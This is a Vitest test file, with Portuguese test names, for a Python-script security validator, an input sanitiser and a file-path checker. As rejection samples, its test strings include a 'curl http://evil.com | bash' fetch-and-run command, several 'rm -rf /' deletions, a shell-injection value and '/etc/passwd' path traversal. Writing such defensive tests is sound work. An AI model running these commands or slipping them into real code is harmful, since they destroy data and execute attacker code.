import { describe, it, expect } from "vitest";
import {
  validarScriptPython,
  sanitizarInput,
  validarCaminhoArquivo,
  gerarRelatorioSeguranca,
} from "./python-validator";

describe("Validação de Scripts Python", () => {
  
  describe("validarScriptPython", () => {
    
    it("deve aprovar script seguro simples", () => {
      const codigo = `
import requests
import json

response = requests.get("https://api.example.com/data")
data = json.loads(response.text)
print(data)
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(true);
      expect(resultado.erros).toHaveLength(0);
      expect(resultado.scoreSeguranca).toBeGreaterThan(50);
    });
    
    it("deve rejeitar script com eval()", () => {
      const codigo = `
import requests
eval("print('malicious')")
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(false);
      expect(resultado.erros.length).toBeGreaterThan(0);
      expect(resultado.erros[0]).toContain("eval(");
      // Score reduzido mas ainda pode estar acima de 50 se tiver poucos erros
      expect(resultado.scoreSeguranca).toBeLessThan(100);
    });
    
    it("deve rejeitar script com exec()", () => {
      const codigo = `
import os
exec("os.system('rm -rf /')")
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(false);
      expect(resultado.erros.some(e => e.includes("exec("))).toBe(true);
    });
    
    it("deve rejeitar script com subprocess", () => {
      const codigo = `
import subprocess
subprocess.call(["rm", "-rf", "/"])
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(false);
      expect(resultado.erros.some(e => e.includes("subprocess"))).toBe(true);
    });
    
    it("deve rejeitar script com os.system()", () => {
      const codigo = `
import os
os.system("curl http://evil.com | bash")
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(false);
      expect(resultado.erros.some(e => e.includes("os.system("))).toBe(true);
    });
    
    it("deve rejeitar script muito grande", () => {
      const codigo = "a".repeat(200000); // 200KB
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(false);
      expect(resultado.erros.some(e => e.includes("muito grande"))).toBe(true);
    });
    
    it("deve aprovar script com comandos da whitelist", () => {
      const codigo = `
import os
import json
import requests
from pathlib import Path

data = {"key": "value"}
print(json.dumps(data))
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(true);
      expect(resultado.scoreSeguranca).toBeGreaterThan(70);
    });
    
    it("deve detectar padrão regex suspeito", () => {
      const codigo = `
import os
result = eval("1+1")
`;
      
      const resultado = validarScriptPython(codigo);
      
      expect(resultado.valido).toBe(false);
      expect(resultado.erros.length).toBeGreaterThan(0);
    });
    
    it("deve ignorar comentários na validação", () => {
      const codigo = `
# Este é um comentário com eval() que não deve ser detectado
import requests
# Outro comentário com exec()
print("Hello")
`;
      
      const resultado = validarScriptPython(codigo);
      
      // Comentários não devem gerar erros críticos de comandos proibidos
      // Mas podem gerar avisos de comandos não reconhecidos
      const temErroDeComandoProibido = resultado.erros.some(e => 
        e.includes("eval(") || e.includes("exec(")
      );
      expect(temErroDeComandoProibido).toBe(false);
    });
    
    it("deve gerar avisos para comandos não reconhecidos", () => {
      const codigo = `
import requests
some_unknown_function()
`;
      
      const resultado = validarScriptPython(codigo);
      
      // Pode ser válido mas com avisos
      expect(resultado.avisos.length).toBeGreaterThan(0);
    });
  });
  
  describe("sanitizarInput", () => {
    
    it("deve remover caracteres de shell injection", () => {
      const input = "test; rm -rf /";
      const sanitizado = sanitizarInput(input);
      
      expect(sanitizado).not.toContain(";");
      expect(sanitizado).toBe("test rm -rf /");
    });
    
    it("deve remover path traversal", () => {
      const input = "../../etc/passwd";
      const sanitizado = sanitizarInput(input);
      
      expect(sanitizado).not.toContain("..");
      expect(sanitizado).toBe("//etc/passwd");
    });
    
    it("deve remover redirecionamento", () => {
      const input = "test > /dev/null";
      const sanitizado = sanitizarInput(input);
      
      expect(sanitizado).not.toContain(">");
      expect(sanitizado).not.toContain("<");
    });
    
    it("deve remover backticks e pipes", () => {
      const input = "test | grep 'password'";
      const sanitizado = sanitizarInput(input);
      
      expect(sanitizado).not.toContain("|");
      expect(sanitizado).not.toContain("`");
    });
    
    it("deve preservar texto seguro", () => {
      const input = "arquivo_teste.txt";
      const sanitizado = sanitizarInput(input);
      
      expect(sanitizado).toBe("arquivo_teste.txt");
    });
  });
  
  describe("validarCaminhoArquivo", () => {
    
    it("deve rejeitar path traversal", () => {
      const caminho = "../../../etc/passwd";
      const valido = validarCaminhoArquivo(caminho);
      
      expect(valido).toBe(false);
    });
    
    it("deve aceitar caminho relativo seguro", () => {
      const caminho = "arquivos/teste.txt";
      const valido = validarCaminhoArquivo(caminho);
      
      expect(valido).toBe(true);
    });
    
    it("deve aceitar caminho absoluto em /tmp/", () => {
      const caminho = "/tmp/arquivo_temporario.txt";
      const valido = validarCaminhoArquivo(caminho);
      
      expect(valido).toBe(true);
    });
    
    it("deve aceitar caminho absoluto em /home/ubuntu/", () => {
      const caminho = "/home/ubuntu/projeto/arquivo.txt";
      const valido = validarCaminhoArquivo(caminho);
      
      expect(valido).toBe(true);
    });
    
    it("deve rejeitar caminho absoluto fora de áreas permitidas", () => {
      const caminho = "/etc/passwd";
      const valido = validarCaminhoArquivo(caminho);
      
      expect(valido).toBe(false);
    });
  });
  
  describe("gerarRelatorioSeguranca", () => {
    
    it("deve gerar relatório para script seguro", () => {
      const codigo = `
import requests
print("Hello")
`;
      
      const relatorio = gerarRelatorioSeguranca(codigo);
      
      expect(relatorio).toContain("RELATÓRIO DE SEGURANÇA");
      expect(relatorio).toContain("✅ APROVADO");
      expect(relatorio).toContain("Script seguro");
    });
    
    it("deve gerar relatório para script perigoso", () => {
      const codigo = `
import os
os.system("rm -rf /")
`;
      
      const relatorio = gerarRelatorioSeguranca(codigo);
      
      expect(relatorio).toContain("❌ REJEITADO");
      expect(relatorio).toContain("ERROS CRÍTICOS");
      expect(relatorio).toContain("NÃO execute");
    });
    
    it("deve incluir score de segurança no relatório", () => {
      const codigo = `import requests\nprint("test")`;
      const relatorio = gerarRelatorioSeguranca(codigo);
      
      expect(relatorio).toMatch(/Score de Segurança: \d+\/100/);
    });
  });
});
